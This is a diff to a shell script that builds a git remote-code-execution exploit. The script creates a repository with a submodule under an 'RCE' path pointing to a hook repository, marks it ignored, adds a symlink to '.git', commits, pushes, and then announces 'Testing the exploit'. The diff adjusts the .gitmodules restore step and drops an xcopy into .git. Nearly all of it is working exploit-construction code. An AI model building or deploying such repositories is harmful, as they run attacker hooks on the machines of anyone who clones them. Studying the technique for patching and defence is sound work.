@@ -69,17 +69,14 @@ fi
 git clone --no-recursive --filter=blob:none --depth=1 --single-branch --no-tags --no-checkout "$main_repo_path" git_rce_main ||error_handler
 cd git_rce_main ||error_handler
 git reset --no-refresh --mixed --quiet HEAD ||error_handler
-git restore --worktree --source=HEAD .gitmodules
 git diff --cached --quiet HEAD ||error_handler
-git checkout HEAD .gitmodules ||error_handler
+git ls-files --error-unmatch .gitmodules &&git restore --worktree --source=HEAD .gitmodules ||error_handler
 git submodule add --name RCE/scripts "$hook_repo_path" GITLNK/modules/RCE ||error_handler
 git config -f .gitmodules submodule.RCE/scripts.ignore all ||error_handler
 git add .gitmodules ||error_handler
 git diff --cached --quiet HEAD ||git commit -m "add-submodule" ||error_handler
 git update-index --add --cacheinfo 120000 $(echo -n ".git" | git hash-object -w --stdin) gitlnk ||error_handler
 git diff --cached --quiet HEAD ||git commit -m "add-symlink" ||error_handler
-xcopy GITLNK .git //b //e //v //r //i //g //h //o //c //k //y ||error_handler
-git reset --hard HEAD ||error_handler
 git push origin HEAD ||error_handler
 cd .. ||error_handler
 echo Testing the exploit...
